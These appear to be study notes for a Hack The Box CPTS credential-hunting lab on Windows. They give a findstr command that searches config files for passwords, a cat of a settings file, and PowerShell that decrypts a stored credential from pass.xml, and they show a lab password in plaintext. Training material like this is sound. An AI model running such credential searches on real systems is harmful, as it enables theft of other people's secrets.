# [Credential Hunting](CPTS/Windows%20Privilege%20Escalation/Credential%20Theft/Credential%20Hunting.md)
### Search the file system for a file containing a password. Submit the password as your answer.

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
![](Screenshot%202026-08-24%20at%2008.50.25.png)

```powershell
cat "C:\Users\Public\Documents\Settings.xml"
```
![](Screenshot%202026-08-24%20at%2008.53.24.png)
### Connect as the bob user and practice decrypting the credentials in the pass.xml file. Submit the contents of the flag.txt on the desktop once you are done.

```powershell
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

bob


PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```
![](Screenshot%202026-08-24%20at%2008.59.19.png)
